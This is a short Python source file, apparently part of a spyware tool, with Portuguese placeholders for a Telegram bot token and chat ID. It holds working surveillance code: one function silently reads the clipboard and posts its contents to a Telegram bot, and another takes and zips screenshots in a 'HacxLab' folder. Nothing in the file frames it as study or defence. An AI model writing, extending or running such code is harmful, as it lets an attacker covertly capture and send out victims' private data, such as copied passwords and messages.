import pyperclip, logging, requests, zipfile, os, time, pyautogui

TOKEN = "SEU_TOKEN_DO_BOT_AQUI"
CHAT_ID = "SEU_CHAT_ID_AQUI"

def capture_clipboard():
    try:
        clip = pyperclip.paste()
        if clip:
            logging.info(f"Clipboard: {clip}")
            send_telegram_message(f"Clipboard: {clip}")
    except:
        pass

def take_screenshot():
    screenshot_dir = "C:\\HacxLab\\screenshots"
    os.makedirs(screenshot_dir, exist_ok=True)
    ts = time.strftime("%Y%m%d_%H%M%S")
    png = os.path.join(screenshot_dir, f"screenshot_{ts}.png")
    zipf = os.path.join(screenshot_dir, f"screenshot_{ts}.zip")
    pyautogui.screenshot().save(png)
    with zipfile.ZipFile(zipf,'w',zipfile.ZIP_DEFLATED) as z:
        z.write(png, os.path.basename(png))
    os.remove(png)

def send_telegram_message(msg):
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": msg})
    except:
        pass